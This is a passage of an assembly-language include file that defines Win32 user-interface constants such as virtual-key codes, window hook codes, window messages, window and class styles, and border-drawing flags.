 VK_HANGEUL        EQU 15h
 VK_HANGUL         EQU 15h
 VK_JUNJA          EQU 17h
 VK_FINAL          EQU 18h
 VK_HANJA          EQU 19h
 VK_KANJI          EQU 19h
 VK_ESCAPE         EQU 1Bh
 VK_CONVERT        EQU 1Ch
 VK_NONCONVERT     EQU 1Dh
 VK_ACCEPT         EQU 1Eh
 VK_MODECHANGE     EQU 1Fh
 VK_SPACE          EQU 20h
 VK_PRIOR          EQU 21h
 VK_NEXT           EQU 22h
 VK_END            EQU 23h
 VK_HOME           EQU 24h
 VK_LEFT           EQU 25h
 VK_UP             EQU 26h
 VK_RIGHT          EQU 27h
 VK_DOWN           EQU 28h
 VK_SELECT         EQU 29h
 VK_PRINT          EQU 2Ah
 VK_EXECUTE        EQU 2Bh
 VK_SNAPSHOT       EQU 2Ch
 VK_INSERT         EQU 2Dh
 VK_DELETE         EQU 2Eh
 VK_HELP           EQU 2Fh
 VK_0              EQU '0'
 VK_1              EQU '1'
 VK_2              EQU '2'
 VK_3              EQU '3'
 VK_4              EQU '4'
 VK_5              EQU '5'
 VK_6              EQU '6'
 VK_7              EQU '7'
 VK_8              EQU '8'
 VK_9              EQU '9'
 VK_A              EQU 'A'
 VK_B              EQU 'B'
 VK_C              EQU 'C'
 VK_D              EQU 'D'
 VK_E              EQU 'E'
 VK_F              EQU 'F'
 VK_G              EQU 'G'
 VK_H              EQU 'H'
 VK_I              EQU 'I'
 VK_J              EQU 'J'
 VK_K              EQU 'K'
 VK_L              EQU 'L'
 VK_M              EQU 'M'
 VK_N              EQU 'N'
 VK_O              EQU 'O'
 VK_P              EQU 'P'
 VK_Q              EQU 'Q'
 VK_R              EQU 'R'
 VK_S              EQU 'S'
 VK_T              EQU 'T'
 VK_U              EQU 'U'
 VK_V              EQU 'V'
 VK_W              EQU 'W'
 VK_X              EQU 'X'
 VK_Y              EQU 'Y'
 VK_Z              EQU 'Z'
 VK_LWIN           EQU 5Bh
 VK_RWIN           EQU 5Ch
 VK_APPS           EQU 5Dh
 VK_NUMPAD0        EQU 60h
 VK_NUMPAD1        EQU 61h
 VK_NUMPAD2        EQU 62h
 VK_NUMPAD3        EQU 63h
 VK_NUMPAD4        EQU 64h
 VK_NUMPAD5        EQU 65h
 VK_NUMPAD6        EQU 66h
 VK_NUMPAD7        EQU 67h
 VK_NUMPAD8        EQU 68h
 VK_NUMPAD9        EQU 69h
 VK_MULTIPLY       EQU 6Ah
 VK_ADD            EQU 6Bh
 VK_SEPARATOR      EQU 6Ch
 VK_SUBTRACT       EQU 6Dh
 VK_DECIMAL        EQU 6Eh
 VK_DIVIDE         EQU 6Fh
 VK_F1             EQU 70h
 VK_F2             EQU 71h
 VK_F3             EQU 72h
 VK_F4             EQU 73h
 VK_F5             EQU 74h
 VK_F6             EQU 75h
 VK_F7             EQU 76h
 VK_F8             EQU 77h
 VK_F9             EQU 78h
 VK_F10            EQU 79h
 VK_F11            EQU 7Ah
 VK_F12            EQU 7Bh
 VK_F13            EQU 7Ch
 VK_F14            EQU 7Dh
 VK_F15            EQU 7Eh
 VK_F16            EQU 7Fh
 VK_F17            EQU 80h
 VK_F18            EQU 81h
 VK_F19            EQU 82h
 VK_F20            EQU 83h
 VK_F21            EQU 84h
 VK_F22            EQU 85h
 VK_F23            EQU 86h
 VK_F24            EQU 87h
 VK_NUMLOCK        EQU 90h
 VK_SCROLL         EQU 91h
 VK_LSHIFT         EQU A0h
 VK_RSHIFT         EQU A1h
 VK_LCONTROL       EQU A2h
 VK_RCONTROL       EQU A3h
 VK_LMENU          EQU A4h
 VK_RMENU          EQU A5h
 VK_ATTN           EQU F6h
 VK_CRSEL          EQU F7h
 VK_EXSEL          EQU F8h
 VK_EREOF          EQU F9h
 VK_PLAY           EQU FAh
 VK_ZOOM           EQU FBh
 VK_NONAME         EQU FCh
 VK_PA1            EQU FDh
 VK_OEM_CLEAR      EQU FEh

; SetWindowsHook() codes

 WH_MIN              EQU -1
 WH_MSGFILTER        EQU -1
 WH_JOURNALRECORD    EQU 0
 WH_JOURNALPLAYBACK  EQU 1
 WH_KEYBOARD         EQU 2
 WH_GETMESSAGE       EQU 3
 WH_CALLWNDPROC      EQU 4
 WH_CBT              EQU 5
 WH_SYSMSGFILTER     EQU 6
 WH_MOUSE            EQU 7
 WH_HARDWARE         EQU 8
 WH_DEBUG            EQU 9
 WH_SHELL            EQU 10
 WH_FOREGROUNDIDLE   EQU 11
 WH_CALLWNDPROCRET   EQU 12
 WH_KEYBOARD_LL      EQU 13
 WH_MOUSE_LL         EQU 14
 WH_MAX              EQU 14

 WH_MINHOOK          EQU WH_MIN
 WH_MAXHOOK          EQU WH_MAX

; Hook Codes

 HC_ACTION           EQU 0
 HC_GETNEXT          EQU 1
 HC_SKIP             EQU 2
 HC_NOREMOVE         EQU 3
 HC_NOREM            EQU HC_NOREMOVE
 HC_SYSMODALON       EQU 4
 HC_SYSMODALOFF      EQU 5

; CBT Hook Codes

 HCBT_MOVESIZE       EQU 0
 HCBT_MINMAX         EQU 1
 HCBT_QS             EQU 2
 HCBT_CREATEWND      EQU 3
 HCBT_DESTROYWND     EQU 4
 HCBT_ACTIVATE       EQU 5
 HCBT_CLICKSKIPPED   EQU 6
 HCBT_KEYSKIPPED     EQU 7
 HCBT_SYSCOMMAND     EQU 8
 HCBT_SETFOCUS       EQU 9

; WH_MSGFILTER Filter Proc Codes

 MSGF_DIALOGBOX      EQU 0
 MSGF_MESSAGEBOX     EQU 1
 MSGF_MENU           EQU 2
 MSGF_SCROLLBAR      EQU 5
 MSGF_NEXTWINDOW     EQU 6
 MSGF_MAX            EQU 8                       ; unused
 MSGF_USER           EQU 4096

; Shell support

 HSHELL_WINDOWCREATED        EQU 1
 HSHELL_WINDOWDESTROYED      EQU 2
 HSHELL_ACTIVATESHELLWINDOW  EQU 3
 HSHELL_WINDOWACTIVATED      EQU 4
 HSHELL_GETMINRECT           EQU 5
 HSHELL_REDRAW               EQU 6
 HSHELL_TASKMAN              EQU 7
 HSHELL_LANGUAGE             EQU 8
 HSHELL_ACCESSIBILITYSTATE   EQU 11
 ACCESS_STICKYKEYS           EQU 0001h
 ACCESS_FILTERKEYS           EQU 0002h
 ACCESS_MOUSEKEYS            EQU 0003h

; Low level hook flags

 LLKHF_EXTENDED       EQU KF_EXTENDED shr 8
 LLKHF_INJECTED       EQU 00000010h
 LLKHF_ALTDOWN        EQU KF_ALTDOWN shr 8
 LLKHF_UP             EQU KF_UP shr 8
 LLMHF_INJECTED       EQU 00000001h

; Keyboard Layout API

 HKL_PREV            EQU 0
 HKL_NEXT            EQU 1

 KLF_ACTIVATE        EQU 00000001h
 KLF_SUBSTITUTE_OK   EQU 00000002h
 KLF_REORDER         EQU 00000008h
 KLF_REPLACELANG     EQU 00000010h
 KLF_NOTELLSHELL     EQU 00000080h
 KLF_SETFORPROCESS   EQU 00000100h

; Size of KeyboardLayoutName (number of characters), including nul terminator

 KL_NAMELENGTH       EQU 9

; Values for resolution parameter of GetMouseMovePoints

 GMMP_USE_DISPLAY_POINTS          EQU 1
 GMMP_USE_HIGH_RESOLUTION_POINTS  EQU 2

; Desktop-specific access flags

 DESKTOP_READOBJECTS         EQU 0001h
 DESKTOP_CREATEWINDOW        EQU 0002h
 DESKTOP_CREATEMENU          EQU 0004h
 DESKTOP_HOOKCONTROL         EQU 0008h
 DESKTOP_JOURNALRECORD       EQU 0010h
 DESKTOP_JOURNALPLAYBACK     EQU 0020h
 DESKTOP_ENUMERATE           EQU 0040h
 DESKTOP_WRITEOBJECTS        EQU 0080h
 DESKTOP_SWITCHDESKTOP       EQU 0100h

; Desktop-specific control flags

 DF_ALLOWOTHERACCOUNTHOOK    EQU 0001

; Windowstation-specific access flags

 WINSTA_ENUMDESKTOPS         EQU 0001h
 WINSTA_READATTRIBUTES       EQU 0002h
 WINSTA_ACCESSCLIPBOARD      EQU 0004h
 WINSTA_CREATEDESKTOP        EQU 0008h
 WINSTA_WRITEATTRIBUTES      EQU 0010h
 WINSTA_ACCESSGLOBALATOMS    EQU 0020h
 WINSTA_EXITWINDOWS          EQU 0040h
 WINSTA_ENUMERATE            EQU 0100h
 WINSTA_READSCREEN           EQU 0200h

; Windowstation-specific attribute flags

 WSF_VISIBLE                 EQU 0001h

; Window field offsets for GetWindowLong()

 GWL_WNDPROC         EQU -4
 GWL_HINSTANCE       EQU -6
 GWL_HWNDPARENT      EQU -8
 GWL_STYLE           EQU -16
 GWL_EXSTYLE         EQU -20
 GWL_USERDATA        EQU -21
 GWL_ID              EQU -12

; Class field offsets for GetClassLong()

 GCL_MENUNAME        EQU -8
 GCL_HBRBACKGROUND   EQU -10
 GCL_HCURSOR         EQU -12
 GCL_HICON           EQU -14
 GCL_HMODULE         EQU -16
 GCL_CBWNDEXTRA      EQU -18
 GCL_CBCLSEXTRA      EQU -20
 GCL_WNDPROC         EQU -24
 GCL_STYLE           EQU -26
 GCW_ATOM            EQU -32
 GCL_HICONSM         EQU -34

; WM_ACTIVATE state values

 WA_INACTIVE     EQU 0
 WA_ACTIVE       EQU 1
 WA_CLICKACTIVE  EQU 2

; Window Messages

 WM_NULL                         EQU 0000h
 WM_CREATE                       EQU 0001h
 WM_DESTROY                      EQU 0002h
 WM_MOVE                         EQU 0003h
 WM_SIZE                         EQU 0005h
 WM_ACTIVATE                     EQU 0006h
 WM_SETFOCUS                     EQU 0007h
 WM_KILLFOCUS                    EQU 0008h
 WM_ENABLE                       EQU 000Ah
 WM_SETREDRAW                    EQU 000Bh
 WM_SETTEXT                      EQU 000Ch
 WM_GETTEXT                      EQU 000Dh
 WM_GETTEXTLENGTH                EQU 000Eh
 WM_PAINT                        EQU 000Fh
 WM_CLOSE                        EQU 0010h
 WM_QUERYENDSESSION              EQU 0011h
 WM_QUERYOPEN                    EQU 0013h
 WM_ENDSESSION                   EQU 0016h
 WM_QUIT                         EQU 0012h
 WM_ERASEBKGND                   EQU 0014h
 WM_SYSCOLORCHANGE               EQU 0015h
 WM_SHOWWINDOW                   EQU 0018h
 WM_WININICHANGE                 EQU 001Ah
 WM_SETTINGCHANGE                EQU WM_WININICHANGE
 WM_DEVMODECHANGE                EQU 001Bh
 WM_ACTIVATEAPP                  EQU 001Ch
 WM_FONTCHANGE                   EQU 001Dh
 WM_TIMECHANGE                   EQU 001Eh
 WM_CANCELMODE                   EQU 001Fh
 WM_SETCURSOR                    EQU 0020h
 WM_MOUSEACTIVATE                EQU 0021h
 WM_CHILDACTIVATE                EQU 0022h
 WM_QUEUESYNC                    EQU 0023h
 WM_GETMINMAXINFO                EQU 0024h
 WM_PAINTICON                    EQU 0026h
 WM_ICONERASEBKGND               EQU 0027h
 WM_NEXTDLGCTL                   EQU 0028h
 WM_SPOOLERSTATUS                EQU 002Ah
 WM_DRAWITEM                     EQU 002Bh
 WM_MEASUREITEM                  EQU 002Ch
 WM_DELETEITEM                   EQU 002Dh
 WM_VKEYTOITEM                   EQU 002Eh
 WM_CHARTOITEM                   EQU 002Fh
 WM_SETFONT                      EQU 0030h
 WM_GETFONT                      EQU 0031h
 WM_SETHOTKEY                    EQU 0032h
 WM_GETHOTKEY                    EQU 0033h
 WM_QUERYDRAGICON                EQU 0037h
 WM_COMPAREITEM                  EQU 0039h
 WM_GETOBJECT                    EQU 003Dh
 WM_COMPACTING                   EQU 0041h
 WM_WINDOWPOSCHANGING            EQU 0046h
 WM_WINDOWPOSCHANGED             EQU 0047h
 WM_POWER                        EQU 0048h
 WM_COPYDATA                     EQU 004Ah
 WM_CANCELJOURNAL                EQU 004Bh
 WM_NOTIFY                       EQU 004Eh
 WM_INPUTLANGCHANGEREQUEST       EQU 0050h
 WM_INPUTLANGCHANGE              EQU 0051h
 WM_TCARD                        EQU 0052h
 WM_HELP                         EQU 0053h
 WM_USERCHANGED                  EQU 0054h
 WM_NOTIFYFORMAT                 EQU 0055h
 WM_CONTEXTMENU                  EQU 007Bh
 WM_STYLECHANGING                EQU 007Ch
 WM_STYLECHANGED                 EQU 007Dh
 WM_DISPLAYCHANGE                EQU 007Eh
 WM_GETICON                      EQU 007Fh
 WM_SETICON                      EQU 0080h
 WM_NCCREATE                     EQU 0081h
 WM_NCDESTROY                    EQU 0082h
 WM_NCCALCSIZE                   EQU 0083h
 WM_NCHITTEST                    EQU 0084h
 WM_NCPAINT                      EQU 0085h
 WM_NCACTIVATE                   EQU 0086h
 WM_GETDLGCODE                   EQU 0087h
 WM_SYNCPAINT                    EQU 0088h
 WM_NCMOUSEMOVE                  EQU 00A0h
 WM_NCLBUTTONDOWN                EQU 00A1h
 WM_NCLBUTTONUP                  EQU 00A2h
 WM_NCLBUTTONDBLCLK              EQU 00A3h
 WM_NCRBUTTONDOWN                EQU 00A4h
 WM_NCRBUTTONUP                  EQU 00A5h
 WM_NCRBUTTONDBLCLK              EQU 00A6h
 WM_NCMBUTTONDOWN                EQU 00A7h
 WM_NCMBUTTONUP                  EQU 00A8h
 WM_NCMBUTTONDBLCLK              EQU 00A9h
 WM_KEYFIRST                     EQU 0100h
 WM_KEYDOWN                      EQU 0100h
 WM_KEYUP                        EQU 0101h
 WM_CHAR                         EQU 0102h
 WM_DEADCHAR                     EQU 0103h
 WM_SYSKEYDOWN                   EQU 0104h
 WM_SYSKEYUP                     EQU 0105h
 WM_SYSCHAR                      EQU 0106h
 WM_SYSDEADCHAR                  EQU 0107h
 WM_KEYLAST                      EQU 0108h
 WM_IME_STARTCOMPOSITION         EQU 010Dh
 WM_IME_ENDCOMPOSITION           EQU 010Eh
 WM_IME_COMPOSITION              EQU 010Fh
 WM_IME_KEYLAST                  EQU 010Fh
 WM_INITDIALOG                   EQU 0110h
 WM_COMMAND                      EQU 0111h
 WM_SYSCOMMAND                   EQU 0112h
 WM_TIMER                        EQU 0113h
 WM_HSCROLL                      EQU 0114h
 WM_VSCROLL                      EQU 0115h
 WM_INITMENU                     EQU 0116h
 WM_INITMENUPOPUP                EQU 0117h
 WM_MENUSELECT                   EQU 011Fh
 WM_MENUCHAR                     EQU 0120h
 WM_ENTERIDLE                    EQU 0121h
 WM_MENURBUTTONUP                EQU 0122h
 WM_MENUDRAG                     EQU 0123h
 WM_MENUGETOBJECT                EQU 0124h
 WM_UNINITMENUPOPUP              EQU 0125h
 WM_MENUCOMMAND                  EQU 0126h
 WM_KEYBOARDCUES                 EQU 0127h
 WM_CTLCOLORMSGBOX               EQU 0132h
 WM_CTLCOLOREDIT                 EQU 0133h
 WM_CTLCOLORLISTBOX              EQU 0134h
 WM_CTLCOLORBTN                  EQU 0135h
 WM_CTLCOLORDLG                  EQU 0136h
 WM_CTLCOLORSCROLLBAR            EQU 0137h
 WM_CTLCOLORSTATIC               EQU 0138h
 WM_MOUSEFIRST                   EQU 0200h
 WM_MOUSEMOVE                    EQU 0200h
 WM_LBUTTONDOWN                  EQU 0201h
 WM_LBUTTONUP                    EQU 0202h
 WM_LBUTTONDBLCLK                EQU 0203h
 WM_RBUTTONDOWN                  EQU 0204h
 WM_RBUTTONUP                    EQU 0205h
 WM_RBUTTONDBLCLK                EQU 0206h
 WM_MBUTTONDOWN                  EQU 0207h
 WM_MBUTTONUP                    EQU 0208h
 WM_MBUTTONDBLCLK                EQU 0209h
 WM_MOUSEWHEEL                   EQU 020Ah
 WM_MOUSELAST                    EQU 0209h
 WM_PARENTNOTIFY                 EQU 0210h
 WM_ENTERMENULOOP                EQU 0211h
 WM_EXITMENULOOP                 EQU 0212h
 WM_NEXTMENU                     EQU 0213h
 WM_SIZING                       EQU 0214h
 WM_CAPTURECHANGED               EQU 0215h
 WM_MOVING                       EQU 0216h
 WM_POWERBROADCAST               EQU 0218h
 WM_DEVICECHANGE                 EQU 0219h
 WM_MDICREATE                    EQU 0220h
 WM_MDIDESTROY                   EQU 0221h
 WM_MDIACTIVATE                  EQU 0222h
 WM_MDIRESTORE                   EQU 0223h
 WM_MDINEXT                      EQU 0224h
 WM_MDIMAXIMIZE                  EQU 0225h
 WM_MDITILE                      EQU 0226h
 WM_MDICASCADE                   EQU 0227h
 WM_MDIICONARRANGE               EQU 0228h
 WM_MDIGETACTIVE                 EQU 0229h
 WM_MDISETMENU                   EQU 0230h
 WM_ENTERSIZEMOVE                EQU 0231h
 WM_EXITSIZEMOVE                 EQU 0232h
 WM_DROPFILES                    EQU 0233h
 WM_MDIREFRESHMENU               EQU 0234h
 WM_IME_SETCONTEXT               EQU 0281h
 WM_IME_NOTIFY                   EQU 0282h
 WM_IME_CONTROL                  EQU 0283h
 WM_IME_COMPOSITIONFULL          EQU 0284h
 WM_IME_SELECT                   EQU 0285h
 WM_IME_CHAR                     EQU 0286h
 WM_IME_REQUEST                  EQU 0288h
 WM_IME_KEYDOWN                  EQU 0290h
 WM_IME_KEYUP                    EQU 0291h
 WM_MOUSEHOVER                   EQU 02A1h
 WM_MOUSELEAVE                   EQU 02A3h
 WM_NCMOUSEHOVER                 EQU 02A0h
 WM_NCMOUSELEAVE                 EQU 02A2h
 WM_CUT                          EQU 0300h
 WM_COPY                         EQU 0301h
 WM_PASTE                        EQU 0302h
 WM_CLEAR                        EQU 0303h
 WM_UNDO                         EQU 0304h
 WM_RENDERFORMAT                 EQU 0305h
 WM_RENDERALLFORMATS             EQU 0306h
 WM_DESTROYCLIPBOARD             EQU 0307h
 WM_DRAWCLIPBOARD                EQU 0308h
 WM_PAINTCLIPBOARD               EQU 0309h
 WM_VSCROLLCLIPBOARD             EQU 030Ah
 WM_SIZECLIPBOARD                EQU 030Bh
 WM_ASKCBFORMATNAME              EQU 030Ch
 WM_CHANGECBCHAIN                EQU 030Dh
 WM_HSCROLLCLIPBOARD             EQU 030Eh
 WM_QUERYNEWPALETTE              EQU 030Fh
 WM_PALETTEISCHANGING            EQU 0310h
 WM_PALETTECHANGED               EQU 0311h
 WM_HOTKEY                       EQU 0312h
 WM_PRINT                        EQU 0317h
 WM_PRINTCLIENT                  EQU 0318h
 WM_HANDHELDFIRST                EQU 0358h
 WM_HANDHELDLAST                 EQU 035Fh
 WM_AFXFIRST                     EQU 0360h
 WM_AFXLAST                      EQU 037Fh
 WM_PENWINFIRST                  EQU 0380h
 WM_PENWINLAST                   EQU 038Fh
 WM_APP                          EQU 8000h
 WM_USER                         EQU 0400h

; Windows Message Size

 WMSZ_LEFT           EQU 1
 WMSZ_RIGHT          EQU 2
 WMSZ_TOP            EQU 3
 WMSZ_TOPLEFT        EQU 4
 WMSZ_TOPRIGHT       EQU 5
 WMSZ_BOTTOM         EQU 6
 WMSZ_BOTTOMLEFT     EQU 7
 WMSZ_BOTTOMRIGHT    EQU 8

; wParam for WM_POWER window message and DRV_POWER driver notification

 PWR_OK              EQU 1
 PWR_FAIL            EQU -1
 PWR_SUSPENDREQUEST  EQU 1
 PWR_SUSPENDRESUME   EQU 2
 PWR_CRITICALRESUME  EQU 3

 NFR_ANSI            EQU 1
 NFR_UNICODE         EQU 2
 NF_QUERY            EQU 3
 NF_REQUERY          EQU 4

; LOWORD(wParam) in WM_KEYBOARDCUES

 KC_SHOW     EQU 1
 KC_HIDE     EQU 2
 KC_QUERY    EQU 3

; HIWORD(wParam) in WM_KEYBOARDCUES

 KCF_FOCUS   EQU 1
 KCF_ACCEL   EQU 2

 WHEEL_DELTA                     EQU 120        ;Value for rolling one detent
;WHEEL_PAGESCROLL                EQU (UINT_MAX) ;Scroll one page

; Advanced Power Management

 PBT_APMQUERYSUSPEND             EQU 0000h
 PBT_APMQUERYSTANDBY             EQU 0001h
 PBT_APMQUERYSUSPENDFAILED       EQU 0002h
 PBT_APMQUERYSTANDBYFAILED       EQU 0003h
 PBT_APMSUSPEND                  EQU 0004h
 PBT_APMSTANDBY                  EQU 0005h
 PBT_APMRESUMECRITICAL           EQU 0006h
 PBT_APMRESUMESUSPEND            EQU 0007h
 PBT_APMRESUMESTANDBY            EQU 0008h
 PBT_APMBATTERYLOW               EQU 0009h
 PBT_APMPOWERSTATUSCHANGE        EQU 000Ah
 PBT_APMOEMEVENT                 EQU 000Bh
 PBT_APMRESUMEAUTOMATIC          EQU 0012h

 PBTF_APMRESUMEFROMFAILURE       EQU 00000001

;MOUSEHOOKSTRUCT STRUC
;                pt           POINT <?>
;                mh_hwnd      DD ?
;                wHitTestCode DD ?
;                dwExtraInfo  DD ?
;MOUSEHOOKSTRUCT ENDS

; WM_NCHITTEST and MOUSEHOOKSTRUCT Mouse Position Codes

 HTERROR             EQU -2
 HTTRANSPARENT       EQU -1
 HTNOWHERE           EQU 0
 HTCLIENT            EQU 1
 HTCAPTION           EQU 2
 HTSYSMENU           EQU 3
 HTGROWBOX           EQU 4
 HTSIZE              EQU HTGROWBOX
 HTMENU              EQU 5
 HTHSCROLL           EQU 6
 HTVSCROLL           EQU 7
 HTMINBUTTON         EQU 8
 HTMAXBUTTON         EQU 9
 HTLEFT              EQU 10
 HTRIGHT             EQU 11
 HTTOP               EQU 12
 HTTOPLEFT           EQU 13
 HTTOPRIGHT          EQU 14
 HTBOTTOM            EQU 15
 HTBOTTOMLEFT        EQU 16
 HTBOTTOMRIGHT       EQU 17
 HTBORDER            EQU 18
 HTREDUCE            EQU HTMINBUTTON
 HTZOOM              EQU HTMAXBUTTON
 HTSIZEFIRST         EQU HTLEFT
 HTSIZELAST          EQU HTBOTTOMRIGHT
 HTOBJECT            EQU 19
 HTCLOSE             EQU 20
 HTHELP              EQU 21

; SendMessageTimeout values

 SMTO_NORMAL             EQU 0000h
 SMTO_BLOCK              EQU 0001h
 SMTO_ABORTIFHUNG        EQU 0002h
 SMTO_NOTIMEOUTIFNOTHUNG EQU 0008h

; WM_MOUSEACTIVATE Return Codes

 MA_ACTIVATE         EQU 1
 MA_ACTIVATEANDEAT   EQU 2
 MA_NOACTIVATE       EQU 3
 MA_NOACTIVATEANDEAT EQU 4

; WM_SETICON / WM_GETICON Type Codes

 ICON_SMALL          EQU 0
 ICON_BIG            EQU 1

; WM_SIZE message wParam values

 SIZE_RESTORED       EQU 0
 SIZE_MINIMIZED      EQU 1
 SIZE_MAXIMIZED      EQU 2
 SIZE_MAXSHOW        EQU 3
 SIZE_MAXHIDE        EQU 4

; WM_NCCALCSIZE "window valid rect" return values

 WVR_ALIGNTOP        EQU 0010h
 WVR_ALIGNLEFT       EQU 0020h
 WVR_ALIGNBOTTOM     EQU 0040h
 WVR_ALIGNRIGHT      EQU 0080h
 WVR_HREDRAW         EQU 0100h
 WVR_VREDRAW         EQU 0200h
 WVR_REDRAW          EQU (WVR_HREDRAW OR WVR_VREDRAW)
 WVR_VALIDRECTS      EQU 0400h

; Key State Masks for Mouse Messages

 MK_LBUTTON      EQU 0001h
 MK_RBUTTON      EQU 0002h
 MK_SHIFT        EQU 0004h
 MK_CONTROL      EQU 0008h
 MK_MBUTTON      EQU 0010h

 TME_HOVER       EQU 00000001h
 TME_LEAVE       EQU 00000002h
 TME_NONCLIENT   EQU 00000010h
 TME_QUERY       EQU 40000000h
 TME_CANCEL      EQU 80000000h

 HOVER_DEFAULT   EQU 0FFFFFFFFh

; Window styles

 WS_OVERLAPPED       EQU 00000000h
 WS_POPUP            EQU 80000000h
 WS_CHILD            EQU 40000000h
 WS_MINIMIZE         EQU 20000000h
 WS_VISIBLE          EQU 10000000h
 WS_DISABLED         EQU 08000000h
 WS_CLIPSIBLINGS     EQU 04000000h
 WS_CLIPCHILDREN     EQU 02000000h
 WS_MAXIMIZE         EQU 01000000h
 WS_CAPTION          EQU 00C00000h ;!!!!WS_BORDER OR WS_DLGFRAME
 WS_BORDER           EQU 00800000h
 WS_DLGFRAME         EQU 00400000h
 WS_VSCROLL          EQU 00200000h
 WS_HSCROLL          EQU 00100000h
 WS_SYSMENU          EQU 00080000h
 WS_THICKFRAME       EQU 00040000h
 WS_GROUP            EQU 00020000h
 WS_TABSTOP          EQU 00010000h
 WS_MINIMIZEBOX      EQU 00020000h
 WS_MAXIMIZEBOX      EQU 00010000h
 WS_TILED            EQU WS_OVERLAPPED
 WS_ICONIC           EQU WS_MINIMIZE
 WS_SIZEBOX          EQU WS_THICKFRAME
 WS_TILEDWINDOW      EQU WS_OVERLAPPEDWINDOW

 WS_OVERLAPPEDWINDOW EQU (WS_OVERLAPPED     OR \
                          WS_CAPTION        OR \
                          WS_SYSMENU        OR \
                          WS_THICKFRAME     OR \
                          WS_MINIMIZEBOX    OR \
                          WS_MAXIMIZEBOX)

 WS_POPUPWINDOW      EQU (WS_POPUP          OR \
                          WS_BORDER         OR \
                          WS_SYSMENU)

 WS_CHILDWINDOW      EQU WS_CHILD

; Extended Window Styles

 WS_EX_DLGMODALFRAME     EQU 00000001h
 WS_EX_NOPARENTNOTIFY    EQU 00000004h
 WS_EX_TOPMOST           EQU 00000008h
 WS_EX_ACCEPTFILES       EQU 00000010h
 WS_EX_TRANSPARENT       EQU 00000020h
 WS_EX_MDICHILD          EQU 00000040h
 WS_EX_TOOLWINDOW        EQU 00000080h
 WS_EX_WINDOWEDGE        EQU 00000100h
 WS_EX_CLIENTEDGE        EQU 00000200h
 WS_EX_CONTEXTHELP       EQU 00000400h
 WS_EX_RIGHT             EQU 00001000h
 WS_EX_LEFT              EQU 00000000h
 WS_EX_RTLREADING        EQU 00002000h
 WS_EX_LTRREADING        EQU 00000000h
 WS_EX_LEFTSCROLLBAR     EQU 00004000h
 WS_EX_RIGHTSCROLLBAR    EQU 00000000h
 WS_EX_CONTROLPARENT     EQU 00010000h
 WS_EX_STATICEDGE        EQU 00020000h
 WS_EX_APPWINDOW         EQU 00040000h
 WS_EX_OVERLAPPEDWINDOW  EQU (WS_EX_WINDOWEDGE OR WS_EX_CLIENTEDGE)
 WS_EX_PALETTEWINDOW     EQU (WS_EX_WINDOWEDGE OR WS_EX_TOOLWINDOW OR WS_EX_TOPMOST)
 WS_EX_LAYERED           EQU 00080000h
 WS_EX_NOINHERITLAYOUT   EQU 00100000h ; Disable inheritence of mirroring by children
 WS_EX_LAYOUTRTL         EQU 00400000h ; Right to left mirroring
 WS_EX_NOACTIVATE        EQU 08000000h
 ; Extended Window Styles (low words)
 WS_EX_DLGMODALFRAME  = 0001
 WS_EX_DRAGOBJECT     = 0002
 WS_EX_NOPARENTNOTIFY = 0004
 WS_EX_TOPMOST        = 0008

; Class styles

 CS_VREDRAW          EQU 0001h
 CS_HREDRAW          EQU 0002h
 CS_DBLCLKS          EQU 0008h
 CS_OWNDC            EQU 0020h
 CS_CLASSDC          EQU 0040h
 CS_PARENTDC         EQU 0080h
 CS_NOCLOSE          EQU 0200h
 CS_SAVEBITS         EQU 0800h
 CS_BYTEALIGNCLIENT  EQU 1000h
 CS_BYTEALIGNWINDOW  EQU 2000h
 CS_GLOBALCLASS      EQU 4000h
 CW_USEDEFAULT       EQU 8000h
 CS_IME              EQU 00010000h

;WM_PRINT flags

 PRF_CHECKVISIBLE    EQU 00000001h
 PRF_NONCLIENT       EQU 00000002h
 PRF_CLIENT          EQU 00000004h
 PRF_ERASEBKGND      EQU 00000008h
 PRF_CHILDREN        EQU 00000010h
 PRF_OWNED           EQU 00000020h

; 3D border styles

 BDR_RAISEDOUTER EQU 0001h
 BDR_SUNKENOUTER EQU 0002h
 BDR_RAISEDINNER EQU 0004h
 BDR_SUNKENINNER EQU 0008h
 BDR_OUTER       EQU (BDR_RAISEDOUTER OR BDR_SUNKENOUTER)
 BDR_INNER       EQU (BDR_RAISEDINNER OR BDR_SUNKENINNER)
 BDR_RAISED      EQU (BDR_RAISEDOUTER OR BDR_RAISEDINNER)
 BDR_SUNKEN      EQU (BDR_SUNKENOUTER OR BDR_SUNKENINNER)
 EDGE_RAISED     EQU (BDR_RAISEDOUTER OR BDR_RAISEDINNER)
 EDGE_SUNKEN     EQU (BDR_SUNKENOUTER OR BDR_SUNKENINNER)
 EDGE_ETCHED     EQU (BDR_SUNKENOUTER OR BDR_RAISEDINNER)
 EDGE_BUMP       EQU (BDR_RAISEDOUTER OR BDR_SUNKENINNER)

; Border flags

 BF_LEFT         EQU 0001h
 BF_TOP          EQU 0002h
 BF_RIGHT        EQU 0004h
 BF_BOTTOM       EQU 0008h
 BF_TOPLEFT      EQU (BF_TOP OR BF_LEFT)
 BF_TOPRIGHT     EQU (BF_TOP OR BF_RIGHT)
 BF_BOTTOMLEFT   EQU (BF_BOTTOM OR BF_LEFT)
 BF_BOTTOMRIGHT  EQU (BF_BOTTOM OR BF_RIGHT)
 BF_RECT         EQU (BF_LEFT OR BF_TOP OR BF_RIGHT OR BF_BOTTOM)
 BF_DIAGONAL     EQU 0010

; For diagonal lines, the BF_RECT flags specify the end point of the
; vector bounded by the rectangle parameter.

 BF_DIAGONAL_ENDTOPRIGHT     EQU (BF_DIAGONAL OR BF_TOP OR BF_RIGHT)
 BF_DIAGONAL_ENDTOPLEFT      EQU (BF_DIAGONAL OR BF_TOP OR BF_LEFT)
 BF_DIAGONAL_ENDBOTTOMLEFT   EQU (BF_DIAGONAL OR BF_BOTTOM OR BF_LEFT)
 BF_DIAGONAL_ENDBOTTOMRIGHT  EQU (BF_DIAGONAL OR BF_BOTTOM OR BF_RIGHT)

 BF_MIDDLE       EQU 0800h ;Fill in the middle
 BF_SOFT         EQU 1000h ;For softer buttons
 BF_ADJUST       EQU 2000h ;Calculate the space left over
 BF_FLAT         EQU 4000h ;For flat rather than 3D borders
 BF_MONO         EQU 8000h ;For monochrome borders

; flags for DrawFrameControl

 DFC_CAPTION             EQU 1
 DFC_MENU                EQU 2
 DFC_SCROLL              EQU 3
 DFC_BUTTON              EQU 4
 DFC_POPUPMENU           EQU 5
 DFCS_CAPTIONCLOSE       EQU 0000h
 DFCS_CAPTIONMIN         EQU 0001h
 DFCS_CAPTIONMAX         EQU 0002h
 DFCS_CAPTIONRESTORE     EQU 0003h
